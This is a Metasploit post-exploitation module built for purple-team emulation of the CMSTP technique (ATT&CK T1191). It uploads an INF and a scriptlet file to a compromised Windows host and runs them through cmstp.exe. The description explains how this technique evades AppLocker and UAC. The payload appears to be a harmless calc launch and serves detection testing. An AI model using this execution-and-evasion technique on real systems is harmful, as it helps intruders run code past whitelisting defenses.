##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple
  include Msf::Post::Windows::Services

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'CMSTP (T1191) Windows - Purple Team',
        'Description'   => %q{
          Defense Evasion, Execution:
          The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

          Adversaries may supply CMSTP.exe with INF files infected with malicious commands. Similar to Regsvr32 / "Squiblydoo", CMSTP.exe may be abused to load and execute DLLs and/or COM scriptlets (SCT) from remote servers. This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.

          CMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1191' ],
        [ 'URL', 'https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1191' ],
        [ 'URL', 'https://lolbas-project.github.io/lolbas/Binaries/Cmstp/'] ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

        register_options(
        [
          OptString.new("INF_TO_UPLOAD", [true, 'INF to be loaded on target host', ::File.join(Msf::Config.data_directory, 'purple', 't1191', 't1191.inf')]),
          OptString.new("SCT_TO_UPLOAD", [true, 'SCT to be loaded on target host for local option', ::File.join(Msf::Config.data_directory, 'purple', 't1191', 't1191.sct')]),
          OptString.new("UPLOAD_PATH", [true, 'File upload path', 'C:\\t1191.inf']),
          OptEnum.new("INFLOC", [true, 'Local or remote sct file? Currently only local is supported', 'local', ['local', 'remote']] ),
          OptBool.new("CLEANUP", [true, 'Cleanup files', true])
        ])
  end

  def run
    begin
      raise "Module requires meterpreter session." if session.type != "meterpreter"
      fail_with(Failure::NoAccess, "Module requires administrator rights.") if not is_admin?

      #kill calc
      print_status("Killing calc")
      kill_calc

      # upload executable
      print_status("Uploading file")
      upload_file("#{datastore['UPLOAD_PATH']}", "#{datastore['INF_TO_UPLOAD']}")

      # upload inf if local
      if datastore['INFLOC'] == 'local'
        upload_file("C:\\t1191.sct", "#{datastore['SCT_TO_UPLOAD']}")
      else
        raise "Only local is supported currently"
      end

      # start inf
      cmd = "C:\\windows\\system32\\cmstp.exe /ni /s #{datastore['UPLOAD_PATH']}"
      run_cmd(cmd, false)
      #res = session.sys.process.execute(cmd)

      print_status("Waiting 3 seconds")
      sleep(3)

      # do cleanup
      if datastore['CLEANUP']
        print_status('Removing files.')
        register_file_for_cleanup("#{datastore['UPLOAD_PATH']}")
        register_file_for_cleanup("C:\\t1191.sct")
        kill_calc(true)
      end

      print_good("Module T1191 execution successful.")

    rescue ::Exception => e
      print_error("#{e.message}")
      print_error("Module T1191 execution failed.")
    end
  end
end
